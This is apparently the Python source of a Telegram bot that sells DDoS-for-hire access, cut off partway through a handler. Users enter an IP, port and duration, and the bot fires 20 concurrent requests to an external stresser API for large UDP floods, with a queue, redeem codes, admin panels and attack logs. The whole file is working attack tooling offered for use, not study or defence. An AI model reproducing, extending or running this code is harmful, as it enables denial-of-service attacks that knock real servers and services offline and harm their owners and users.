# app.py - Premium Only with 20x UDP Concurrent
import os
import logging
import asyncio
import threading
import aiohttp
import time
import json
import re
import socket
import random
import string
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20
MAX_QUEUE = 50

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 GURU Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = False
        try:
            if mongo_uri:
                self.client = MongoClient(mongo_uri, serverSelectionTimeoutMS=5000)
                self.client.admin.command('ping')
                self.db = self.client["guru_bot"]
                self.users = self.db.users
                self.codes = self.db.redeem_codes
                self.logs = self.db.attack_logs
                self.admins = self.db.admins
                
                self.users.create_index("user_id", unique=True)
                self.codes.create_index("code", unique=True)
                
                for admin_id in [OWNER_ID, PSEUDO_OWNER_ID]:
                    if not self.admins.find_one({"user_id": admin_id}):
                        level = "owner" if admin_id == OWNER_ID else "pseudo_owner"
                        self.admins.insert_one({
                            "user_id": admin_id,
                            "level": level,
                            "added_at": datetime.now()
                        })
                logger.info("✅ MongoDB connected")
            else:
                raise Exception("No MongoDB URI")
        except Exception as e:
            logger.warning(f"⚠️ MongoDB failed: {e}, using in-memory")
            self.memory_mode = True
            self.users = {}
            self.codes = {}
            self.logs = []
            self.admins = {
                OWNER_ID: {"user_id": OWNER_ID, "level": "owner"},
                PSEUDO_OWNER_ID: {"user_id": PSEUDO_OWNER_ID, "level": "pseudo_owner"}
            }
    
    def add_user(self, user_id, username=None, first_name=None):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {
                    "username": username, 
                    "first_name": first_name, 
                    "last_active": datetime.now(),
                    "plan": "premium",  # All users are premium by default
                    "plan_expiry": datetime.now() + timedelta(days=30),  # 30 days trial
                    "has_used_code": False
                }},
                upsert=True
            )
        else:
            if user_id not in self.users:
                self.users[user_id] = {
                    "user_id": user_id, 
                    "username": username, 
                    "first_name": first_name,
                    "plan": "premium",
                    "plan_expiry": datetime.now() + timedelta(days=30)
                }
    
    def get_user(self, user_id):
        if not self.memory_mode:
            return self.users.find_one({"user_id": user_id})
        return self.users.get(user_id)
    
    def get_user_plan(self, user_id):
        user = self.get_user(user_id)
        if not user:
            return "premium", datetime.now() + timedelta(days=30)
        
        plan = user.get("plan", "premium")
        expiry = user.get("plan_expiry")
        
        # If no expiry, set default
        if not expiry:
            expiry = datetime.now() + timedelta(days=30)
            self.update_user_plan(user_id, "premium", expiry)
        
        # Check if plan is expired
        if expiry and isinstance(expiry, datetime):
            if expiry < datetime.now():
                # Auto-renew for now (you can change this)
                expiry = datetime.now() + timedelta(days=30)
                self.update_user_plan(user_id, "premium", expiry)
        
        return plan, expiry
    
    def update_user_plan(self, user_id, plan, expiry):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"plan": plan, "plan_expiry": expiry}}
            )
        else:
            if user_id in self.users:
                self.users[user_id]["plan"] = plan
                self.users[user_id]["plan_expiry"] = expiry
    
    def get_user_stats(self, user_id):
        if not self.memory_mode:
            return self.logs.count_documents({"user_id": user_id})
        else:
            return len([l for l in self.logs if l.get("user_id") == user_id])
    
    def get_total_attacks(self):
        if not self.memory_mode:
            return self.logs.count_documents({})
        return len(self.logs)
    
    def is_admin(self, user_id):
        if not self.memory_mode:
            return self.admins.find_one({"user_id": user_id}) is not None
        return user_id in self.admins
    
    def get_admin_level(self, user_id):
        if not self.memory_mode:
            admin = self.admins.find_one({"user_id": user_id})
            return admin.get("level") if admin else None
        return self.admins.get(user_id, {}).get("level")
    
    def is_owner_or_pseudo(self, user_id):
        level = self.get_admin_level(user_id)
        return level in ["owner", "pseudo_owner"]
    
    def add_admin(self, user_id, username, added_by):
        if not self.memory_mode:
            if self.admins.find_one({"user_id": user_id}):
                return False
            self.admins.insert_one({
                "user_id": user_id,
                "username": username,
                "level": "admin",
                "added_by": added_by,
                "added_at": datetime.now()
            })
            return True
        else:
            if user_id in self.admins:
                return False
            self.admins[user_id] = {"user_id": user_id, "level": "admin"}
            return True
    
    def remove_admin(self, user_id):
        if user_id in [OWNER_ID, PSEUDO_OWNER_ID]:
            return False
        if not self.memory_mode:
            result = self.admins.delete_one({"user_id": user_id})
            return result.deleted_count > 0
        else:
            if user_id in self.admins:
                del self.admins[user_id]
                return True
        return False
    
    def get_admins(self):
        if not self.memory_mode:
            return list(self.admins.find({}))
        return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
    
    def ban_user(self, user_id, reason=None, banned_by=None):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
            )
        elif user_id in self.users:
            self.users[user_id]["is_banned"] = True
    
    def unban_user(self, user_id):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"is_banned": False, "ban_reason": None}}
            )
        elif user_id in self.users:
            self.users[user_id]["is_banned"] = False
    
    def is_banned(self, user_id):
        user = self.get_user(user_id)
        return user.get("is_banned", False) if user else False
    
    def create_code(self, code, days, created_by):
        if not self.memory_mode:
            if self.codes.find_one({"code": code}):
                return False
            self.codes.insert_one({
                "code": code,
                "access_days": days,
                "created_by": created_by,
                "created_at": datetime.now(),
                "used_by": None,
                "used_at": None,
                "is_used": False
            })
            return True
        else:
            if code in self.codes:
                return False
            self.codes[code] = {
                "code": code,
                "access_days": days,
                "created_at": datetime.now(),
                "is_used": False
            }
            return True
    
    def use_code(self, code, user_id):
        if not self.memory_mode:
            code_data = self.codes.find_one({"code": code, "is_used": False})
            if code_data:
                self.codes.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                expiry = datetime.now() + timedelta(days=code_data['access_days'])
                self.update_user_plan(user_id, "premium", expiry)
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"has_used_code": True, "code_used": code}}
                )
                return code_data
        else:
            if code in self.codes and not self.codes[code]["is_used"]:
                code_data = self.codes[code]
                code_data["is_used"] = True
                expiry = datetime.now() + timedelta(days=code_data['access_days'])
                self.update_user_plan(user_id, "premium", expiry)
                if user_id in self.users:
                    self.users[user_id]["has_used_code"] = True
                return code_data
        return None
    
    def get_codes(self, only_unused=False):
        if not self.memory_mode:
            query = {"is_used": False} if only_unused else {}
            return list(self.codes.find(query).sort("created_at", -1))
        else:
            codes = list(self.codes.values())
            if only_unused:
                codes = [c for c in codes if not c["is_used"]]
            return codes
    
    def delete_code(self, code):
        if not self.memory_mode:
            result = self.codes.delete_one({"code": code})
            return result.deleted_count > 0
        else:
            if code in self.codes:
                del self.codes[code]
                return True
        return False
    
    def log_attack(self, user_id, target, port, duration, method, status, concurrent_count=20):
        log = {
            "user_id": user_id,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "status": status,
            "concurrent": concurrent_count,
            "timestamp": datetime.now()
        }
        if not self.memory_mode:
            self.logs.insert_one(log)
        else:
            self.logs.append(log)
        
        user = self.get_user(user_id)
        username = user.get("username") if user else None
        first_name = user.get("first_name") if user else None
        return {
            "user_id": user_id,
            "username": username,
            "first_name": first_name,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "concurrent": concurrent_count
        }
    
    def get_all_users(self):
        if not self.memory_mode:
            return list(self.users.find({}))
        return list(self.users.values())

db = Database(MONGO_URI)

# ===== QUEUE & ATTACK MANAGER =====
class AttackQueue:
    def __init__(self):
        self.queue = []
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.is_running = True
        self.is_processing = False
    
    def add_to_queue(self, user_id, target, port, duration):
        with self.lock:
            if len(self.queue) >= MAX_QUEUE:
                return False, f"❌ Queue is full ({MAX_QUEUE} max)"
            
            user_in_queue = sum(1 for q in self.queue if q['user_id'] == user_id)
            if user_in_queue >= MAX_CONCURRENT:
                return False, f"❌ You already have {user_in_queue} attacks in queue"
            
            self.attack_counter += 1
            queue_id = self.attack_counter
            
            queue_entry = {
                'id': queue_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'status': 'queued',
                'added_at': datetime.now(),
                'position': len(self.queue) + 1
            }
            self.queue.append(queue_entry)
            
            return True, queue_entry
    
    def get_queue_position(self, user_id):
        with self.lock:
            positions = []
            for i, q in enumerate(self.queue, 1):
                if q['user_id'] == user_id and q['status'] == 'queued':
                    positions.append(i)
            return positions
    
    def get_queue_status(self, user_id=None):
        with self.lock:
            if user_id:
                return [q for q in self.queue if q['user_id'] == user_id and q['status'] == 'queued']
            return [q for q in self.queue if q['status'] == 'queued']
    
    def kill_switch(self):
        with self.lock:
            killed_count = 0
            for q in self.queue:
                if q['status'] == 'queued':
                    q['status'] = 'killed'
                    killed_count += 1
            for aid, att in list(self.active_attacks.items()):
                if att['status'] == 'running':
                    att['status'] = 'killed'
                    killed_count += 1
            return killed_count
    
    def kill_user_attacks(self, user_id):
        with self.lock:
            killed_count = 0
            for q in self.queue:
                if q['user_id'] == user_id and q['status'] == 'queued':
                    q['status'] = 'killed'
                    killed_count += 1
            for aid, att in list(self.active_attacks.items()):
                if att['user_id'] == user_id and att['status'] == 'running':
                    att['status'] = 'killed'
                    killed_count += 1
            return killed_count
    
    async def process_queue(self):
        if self.is_processing:
            return
        
        self.is_processing = True
        
        try:
            while self.is_running:
                next_attack = None
                with self.lock:
                    for q in self.queue:
                        if q['status'] == 'queued':
                            next_attack = q
                            q['status'] = 'processing'
                            break
                
                if not next_attack:
                    await asyncio.sleep(1)
                    continue
                
                with self.lock:
                    active_count = sum(1 for a in self.active_attacks.values() if a['status'] == 'running')
                    if active_count >= MAX_CONCURRENT:
                        next_attack['status'] = 'queued'
                        await asyncio.sleep(1)
                        continue
                
                user_id = next_attack['user_id']
                target = next_attack['target']
                port = next_attack['port']
                duration = next_attack['duration']
                queue_id = next_attack['id']
                
                with self.lock:
                    self.active_attacks[queue_id] = {
                        'id': queue_id,
                        'user_id': user_id,
                        'target': target,
                        'port': port,
                        'duration': duration,
                        'start_time': datetime.now(),
                        'status': 'running'
                    }
                
                result = await send_20x_udp_attacks(target, port, duration, queue_id)
                attack_info = db.log_attack(user_id, target, port, duration, "udp", "success" if result.get('success') else "failed", 20)
                await send_attack_alert(attack_info)
                
                with self.lock:
                    if queue_id in self.active_attacks:
                        del self.active_attacks[queue_id]
                    self.queue = [q for q in self.queue if q['id'] != queue_id]
                
                await asyncio.sleep(0.5)
                
        except Exception as e:
            logger.error(f"Queue processing error: {e}")
        finally:
            self.is_processing = False

attack_queue = AttackQueue()

# ===== 20x UDP CONCURRENT ATTACK =====
async def send_single_udp_attack(target, port, duration, attack_num):
    """Send a single UDP attack"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    params = {
        "key": API_KEY,
        "host": target,
        "port": port,
        "time": duration,
        "method": "udp",
        "threads": 5000,
        "pps": 5000000,
        "size": 65500,
        "random": "true"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        timeout = aiohttp.ClientTimeout(total=duration + 15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            start_time = time.time()
            async with session.get(url, params=params, headers=headers) as response:
                elapsed = time.time() - start_time
                raw_response = await response.read()
                try:
                    result_text = raw_response.decode('utf-8')
                except:
                    result_text = raw_response.decode('utf-8', errors='ignore')
                
                is_success = (
                    "SUCCESS" in result_text or 
                    "sent" in result_text.lower() or
                    "attack" in result_text.lower() or
                    "Host:" in result_text or
                    "Concurrent:" in result_text
                )
                
                return {
                    "success": is_success,
                    "attack_num": attack_num,
                    "status": response.status,
                    "elapsed": f"{elapsed:.2f}s",
                    "response": result_text[:200]
                }
    except Exception as e:
        return {
            "success": False,
            "attack_num": attack_num,
            "error": str(e)
        }

async def send_20x_udp_attacks(target, port, duration, queue_id):
    """Send 20 concurrent UDP attacks"""
    logger.info(f"🚀 Launching 20x UDP attacks on {target}:{port} (Queue ID: {queue_id})")
    
    tasks = []
    for i in range(1, 21):
        task = send_single_udp_attack(target, port, duration, i)
        tasks.append(task)
    
    results = await asyncio.gather(*tasks)
    success_count = sum(1 for r in results if r.get('success', False))
    
    return {
        "success": success_count > 0,
        "total_attacks": len(results),
        "successful": success_count,
        "failed": len(results) - success_count,
        "results": results
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.add_user(user.id, user.username, user.first_name)
    
    total_attacks = db.get_user_stats(user.id)
    is_admin = db.is_admin(user.id)
    
    plan, expiry = db.get_user_plan(user.id)
    plan_display = "💎 PREMIUM"
    
    if expiry:
        days_left = max(0, (expiry - datetime.now()).days)
        plan_display += f" ({days_left}d left)"
    
    queued = attack_queue.get_queue_status(user.id)
    queue_count = len(queued)
    active = attack_queue.active_attacks
    active_count = sum(1 for a in active.values() if a['user_id'] == user.id)
    
    first_name = user.first_name or "User"
    welcome_msg = (
        f"👋 *WELCOME TO GURU*\n\n"
        f"Hello {first_name}! 👋\n"
        f"📊 Total Attacks: {total_attacks}\n"
        f"📌 Queue: {queue_count} attacks waiting\n"
        f"⚡ Active: {active_count} attacks running\n"
        f"📊 Plan: {plan_display}\n"
        f"⚡ 20x UDP Concurrent: ENABLED\n"
        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user.id) else '❌ BANNED'}"
    )
    
    keyboard = []
    
    if not db.is_banned(user.id):
        keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("📌 MY QUEUE", callback_data="my_queue")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN PANEL", callback_data="admin")])
    
    if db.is_owner_or_pseudo(user.id):
        keyboard.append([InlineKeyboardButton("👑 OWNER PANEL", callback_data="owner")])
    
    if not is_admin:
        keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
    
    await update.message.reply_text(
        welcome_msg,
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

# ===== DIRECT ATTACK COMMAND =====
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT TIME`\n\n"
            "Example: `/attack 91.108.17.25 32002 60`\n\n"
            "⚡ This launches 20x UDP concurrent attacks!\n"
            "📦 Packet Size: 65,500 bytes\n"
            "💪 Threads: 5,000 each\n"
            "⏱️ Time: 60-300 seconds",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        success, result = attack_queue.add_to_queue(user_id, target, port, duration)
        
        if not success:
            await update.message.reply_text(result)
            return
        
        position = attack_queue.get_queue_position(user_id)
        
        await update.message.reply_text(
            f"✅ *20x UDP ATTACK ADDED TO QUEUE*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n"
            f"📦 Packet: `65,500 bytes`\n"
            f"📊 Queue ID: `{result['id']}`\n"
            f"📌 Position: {position[0] if position else 'N/A'}\n"
            f"📊 Queue Size: {len(attack_queue.queue)}/{MAX_QUEUE}\n\n"
            f"⏳ Your 20x attacks will start automatically!",
            parse_mode='Markdown'
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid port or time! Use numbers.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

# ===== BUTTON ATTACK HANDLER =====
async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if db.is_banned(query.from_user.id):
        await query.edit_message_text("❌ You are banned!")
        return
    
    await query.edit_message_text(
        "💥 *20x UDP ATTACK*\n\n"
        "Send: `IP PORT TIME`\n"
        "Example: `91.108.17.25 32002 60`\n\n"
        "⚡ This launches 20 concurrent UDP attacks!\n"
        "📦 Packet Size: 65,500 bytes\n"
        "💪 Threads: 5,000 each\n"
        "⏱️ Time: 60-300 seconds\n\n"
        f"📊 Queue Size: {len(attack_queue.queue)}/{MAX_QUEUE}\n\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        success, result = attack_queue.add_to_queue(user_id, target, port, duration)
        
        if not success:
            await update.message.reply_text(result)
            context.user_data['awaiting_attack'] = False
            return
        
        position = attack_queue.get_queue_position(user_id)
        
        await update.message.reply_text(
            f"✅ *20x UDP ATTACK ADDED TO QUEUE*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n"
            f"📦 Packet: `65,500 bytes`\n"
            f"📊 Queue ID: `{result['id']}`\n"
            f"📌 Position: {position[0] if position else 'N/A'}\n"
            f"📊 Queue Size: {len(attack_queue.queue)}/{MAX_QUEUE}\n\n"
            f"⏳ Your 20x attacks will start automatically!",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

# ===== MY QUEUE =====
async def my_queue_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    queued = attack_queue.get_queue_status(user_id)
    active = attack_queue.active_attacks
    
    if not queued and not any(a['user_id'] == user_id for a in active.values()):
        await query.edit_message_text(
            "📌 *YOUR QUEUE*\n\nNo attacks in queue or active.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
        return
    
    text = "📌 *YOUR QUEUE & ACTIVE ATTACKS*\n\n"
    
    active_for_user = [a for a in active.values() if a['user_id'] == user_id and a['status'] == 'running']
    if active_for_user:
        text += "⚡ *Active Attacks:*\n"
        for a in active_for_user:
            elapsed = (datetime.now() - a['start_time']).seconds
            remaining = max(0, a['duration'] - elapsed)
            text += f"🔹 20x UDP - {a['target']}:{a['port']} - {remaining}s left\n"
        text += "\n"
    
    if queued:
        text += "📌 *Queued Attacks:*\n"
        for i, q in enumerate(queued, 1):
            position = q.get('position', i)
            text += f"🔸 20x UDP - {q['target']}:{q['port']} - {q['duration']}s (Position: {position})\n"
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

# ===== MY PLAN =====
async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    plan, expiry = db.get_user_plan(user_id)
    days_left = max(0, (expiry - datetime.now()).days) if expiry else 30
    
    text = (
        "👤 *MY PLAN*\n\n"
        "📊 Plan: 💎 PREMIUM\n"
        f"⏱️ Remaining: {days_left} days\n"
        f"📅 Expires: {expiry.strftime('%Y-%m-%d') if expiry else 'N/A'}\n\n"
        "📌 Features:\n"
        "• Full access\n"
        "• 20x UDP Concurrent\n"
        "• Priority queue\n"
        "• Unlimited attacks"
    )
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

# ===== INFO =====
async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    level = db.get_admin_level(user_id) or "USER"
    plan, expiry = db.get_user_plan(user_id)
    plan_display = "PREMIUM"
    total_attacks = db.get_user_stats(user_id)
    
    await query.edit_message_text(
        f"👤 *USER INFO*\n\n"
        f"🆔 ID: {user_id}\n"
        f"⭐ Level: {level.upper()}\n"
        f"📊 Plan: {plan_display}\n"
        f"⚡ 20x UDP: ENABLED\n"
        f"💥 Total Attacks: {total_attacks}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

# ===== STATS =====
async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    total_attacks = db.get_total_attacks()
    users = db.get_all_users()
    admins = db.get_admins()
    codes = db.get_codes()
    queue_size = len(attack_queue.queue)
    active = len(attack_queue.active_attacks)
    
    stats_text = (
        f"📊 *BOT STATISTICS*\n\n"
        f"👥 Total Users: {len(users)}\n"
        f"👑 Admins: {len(admins)}\n"
        f"💥 Total Attacks: {total_attacks}\n"
        f"🎫 Redeem Codes: {len(codes)}\n"
        f"📌 Queue Size: {queue_size}/{MAX_QUEUE}\n"
        f"⚡ Active Attacks: {active}/{MAX_CONCURRENT}\n"
        f"⚡ 20x UDP: ENABLED\n"
        f"🌐 Status: ONLINE"
    )
    
    await query.edit_message_text(
        stats_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

# ===== ADMIN PANEL =====
async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("🗑️ DELETE CODE", callback_data="admin_delete")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*\n\nSelect action:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("📅 1 DAY", callback_data="gen_1d")],
        [InlineKeyboardButton("📅 3 DAYS", callback_data="gen_3d")],
        [InlineKeyboardButton("📅 7 DAYS", callback_data="gen_7d")],
        [InlineKeyboardButton("📅 30 DAYS", callback_data="gen_30d")],
        [InlineKeyboardButton("📅 90 DAYS", callback_data="gen_90d")],
        [InlineKeyboardButton("🔙 BACK", callback_data="admin")]
    ]
    
    await query.edit_message_text(
        "➕ *GENERATE CODE*\n\nSelect duration:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    days = int(query.data.split('_')[1].replace('d', ''))
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    if db.create_code(code, days, query.from_user.id):
        await query.edit_message_text(
            f"✅ *CODE GENERATED*\n\n"
            f"Code: `{code}`\n"
            f"Duration: {days} days\n\n"
            f"Share this code with users!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to generate code!")

async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes()
    if not codes:
        text = "📋 No codes generated yet."
    else:
        text = "📋 *REDEEM CODES*\n\n"
        for c in codes[:20]:
            status = "✅" if not c.get('is_used') else f"❌ Used by {c.get('used_by', 'N/A')}"
            text += f"`{c['code']}` - {c['access_days']}d - {status}\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes(only_unused=True)
    if not codes:
        await query.edit_message_text("No unused codes to delete!")
        return
    
    keyboard = []
    for c in codes[:10]:
        keyboard.append([InlineKeyboardButton(f"❌ {c['code']}", callback_data=f"del_{c['code']}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="admin")])
    
    await query.edit_message_text(
        "🗑️ *DELETE CODE*\n\nSelect code to delete:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    code = query.data.split('_')[1]
    if db.delete_code(code):
        await query.edit_message_text(
            f"✅ Code `{code}` deleted!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to delete code!")

# ===== OWNER PANEL =====
async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    queue_size = len(attack_queue.queue)
    active = len(attack_queue.active_attacks)
    
    keyboard = [
        [InlineKeyboardButton("🛑 KILL SWITCH", callback_data="owner_kill")],
        [InlineKeyboardButton("🔪 KILL USER", callback_data="owner_kill_user")],
        [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
        [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
        [InlineKeyboardButton("📌 QUEUE STATUS", callback_data="owner_queue_status")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        f"👑 *OWNER PANEL*\n\n"
        f"📌 Queue Size: {queue_size}/{MAX_QUEUE}\n"
        f"⚡ Active Attacks: {active}/{MAX_CONCURRENT}\n"
        f"⚡ 20x UDP: ENABLED\n\n"
        f"Select action:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def owner_kill_switch_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    killed = attack_queue.kill_switch()
    
    await query.edit_message_text(
        f"🛑 *KILL SWITCH ACTIVATED*\n\n"
        f"✅ {killed} 20x UDP attacks stopped/killed\n"
        f"📌 Queue cleared\n"
        f"⚡ All attacks stopped successfully!",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

# ===== OWNER KILL USER =====
async def owner_kill_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if not db.is_owner_or_pseudo(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    await query.edit_message_text(
        "🔪 *KILL USER ATTACKS*\n\n"
        "Send user ID to kill all their attacks:\n"
        "`123456789`\n\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_kill_user'] = True

async def process_kill_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_kill_user'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_kill_user'] = False
